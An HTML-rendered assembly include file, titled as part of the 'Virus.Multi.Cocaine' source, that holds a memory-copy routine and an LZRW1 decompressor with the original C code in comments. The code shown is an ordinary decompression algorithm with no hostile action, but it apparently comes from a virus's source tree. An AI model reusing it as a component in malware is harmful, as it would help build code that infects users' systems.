<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Multi.Cocaine - LZ.INC.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;void fast_copy(p_src,p_dst,len)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">fast_copy</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">fast_copy</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">lzrw1_decompress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc5">?live1@768</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    void lzrw1_decompress(p_src_first,src_len,p_dst_first,p_dst_len)</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">@27</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">esp</span><span class="sc4">,-</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    /* Input  : Specify input block using p_src_first and src_len.          */</span><span class="sc0">
   </span><span class="sc1">;    /* Input  : Point p_dst_first to the start of the output zone.          */</span><span class="sc0">
   </span><span class="sc1">;    /* Input  : Point p_dst_len to a ULONG to receive the output length.    */</span><span class="sc0">
   </span><span class="sc1">;    /* Input  : Input block and output zone must not overlap. User knows    */</span><span class="sc0">
   </span><span class="sc1">;    /* Input  : upperbound on output block length from earlier compression. */</span><span class="sc0">
   </span><span class="sc1">;    /* Input  : In any case, maximum expansion possible is eight times.     */</span><span class="sc0">
   </span><span class="sc1">;    /* Output : Length of output block written to *p_dst_len.               */</span><span class="sc0">
   </span><span class="sc1">;    /* Output : Output block in Mem[p_dst_first..p_dst_first+*p_dst_len-1]. */</span><span class="sc0">
   </span><span class="sc1">;    /* Output : Writes only  in Mem[p_dst_first..p_dst_first+*p_dst_len-1]. */</span><span class="sc0">
   </span><span class="sc1">;    UBYTE *p_src_first, *p_dst_first; ULONG src_len, *p_dst_len;</span><span class="sc0">
   </span><span class="sc1">;    {UWORD controlbits=0, control;</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@784</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EDI = control, ECX = p_src_first</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">?live1@800</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;     UBYTE *p_src=p_src_first+FLAG_BYTES, *p_dst=p_dst_first,</span><span class="sc0">
   </span><span class="sc1">;           *p_src_post=p_src_first+src_len;</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@816</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits, ECX = p_src_first</span><span class="sc0">
    </span><span class="sc1">;   </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">?live1@832</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EDI = control, ESI = controlbits, ECX = p_src_first</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">?live1@848</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits, ECX = p_src_first</span><span class="sc0">
    </span><span class="sc1">;   </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">?live1@864</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EDI = control, ESI = controlbits, ECX = p_src_first</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;     if (*p_src_first==FLAG_COPY)</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@880</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits, ECX = p_src_first</span><span class="sc0">
    </span><span class="sc1">;   </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@28</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;       {fast_copy(p_src_first+FLAG_BYTES,p_dst_first,src_len-FLAG_BYTES);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@896</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; ECX = p_src_first</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">fast_copy</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        *p_dst_len=src_len-FLAG_BYTES; return;}</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@912</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EDI = @temp14</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@29</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;     while (p_src!=p_src_post)</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@928</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits</span><span class="sc0">
</span><span class="sc5">@28</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@31</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;       {if (controlbits==0)</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">@30</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@32</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;          {control=*p_src++; control|=(*p_src++)&lt;&lt;8; controlbits=16;}</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@960</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EAX = p_src, EDX = p_dst</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc1">;   mov       esi,16</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        if (control&amp;1)</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@976</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits</span><span class="sc0">
</span><span class="sc5">@32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@33</span><span class="sc0">
    
</span><span class="sc1">;   jnc        short @33</span><span class="sc0">
   </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;          {UWORD offset,len; UBYTE *p;</span><span class="sc0">
   </span><span class="sc1">;           offset=(*p_src&amp;0xF0)&lt;&lt;4; len=1+(*p_src++&amp;0xF);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">@34</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">240</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;           offset+=*p_src++&amp;0xFF; p=p_dst-offset;</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@1008</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits, ECX = offset</span><span class="sc0">
    </span><span class="sc1">;   </span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">?live1@1024</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">?live1@1040</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits, ECX = offset</span><span class="sc0">
    </span><span class="sc1">;   </span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@36</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;           while (len--) *p_dst++=*p++;}</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@1056</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EAX = p_src, EDX = p_dst, ECX = p, EDI = control, ESI = controlbits</span><span class="sc0">
    </span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc5">@35</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">@36</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@35</span><span class="sc0">
</span><span class="sc5">@37</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@38</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        else</span><span class="sc0">
   </span><span class="sc1">;           *p_dst++=*p_src++;</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@1072</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EAX = p_src, EDX = p_dst, EDI = control, ESI = controlbits</span><span class="sc0">
</span><span class="sc5">@33</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        control&gt;&gt;=1; controlbits--;</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">@38</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@30</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;       }</span><span class="sc0">
   </span><span class="sc1">;     *p_dst_len=p_dst-p_dst_first;</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@1120</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; EDX = p_dst</span><span class="sc0">
</span><span class="sc5">@31</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    }</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc5">?live1@1136</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc5">@39</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@29</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">       </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">lzrw1_decompress</span><span class="sc0">    </span><span class="sc5">endp</span></div></body>
</html>
